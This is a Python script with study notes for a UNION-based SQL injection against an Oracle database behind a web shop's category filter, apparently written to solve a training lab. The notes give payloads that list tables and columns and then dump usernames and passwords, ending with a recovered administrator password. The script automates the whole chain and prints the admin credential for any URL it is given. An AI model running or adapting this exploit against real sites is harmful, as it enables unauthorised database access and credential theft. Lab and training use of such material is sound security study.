"""
SQLI attack listing the databse contents on oracle databases

dual is a special dummy table in Oracle. 
a fake 1-row table

all_tables  
This is Oracle’s metadata table.
It stores information about tables accessible to the current user.

all_tab_columns
This stores column information.


i got name of the table 
by using the following query
' UNION SELECT table_name,NULL FROM all_tables--

this is the table name USERS_EZBFVE

then i got the column names by using the following query
' UNION SELECT column_name,NULL from all_tab_columns where table_name='USERS_EZBFVE' --

resulted in the following column names

EMAIL
PASSWORD_JIIHPE
USERNAME_XEFVWA

then used this uery 
' UNION SELECT USERNAME_XEFVWA,PASSWORD_JIIHPE%20 from USERS_EZBFVE--
to get the username and password of the administrator

administrator
	htyuowg78kj1dw5568cz
"""


import requests
import sys 
import urllib3
import re 
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def perform_request(url, payload):
    uri="/filter?category="
    r = requests.get(url + uri + payload, verify=False)
    return r.text

def sqli_users_table(url):
    uri="/filter?category="
    payload="' UNION SELECT table_name,NULL FROM all_tables--"
    response=perform_request(url, payload)
    soup=BeautifulSoup(response, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" %(username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for a users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" % users_table)
        # step #5
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s" % username_column)
            print("Found the password column name: %s" % password_column)

            # step #6
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("[-] Did not find the administrator password.")
        else:
            print("Did not find the username and/or the password columns.")

    else:
        print("Did not find a users table.")
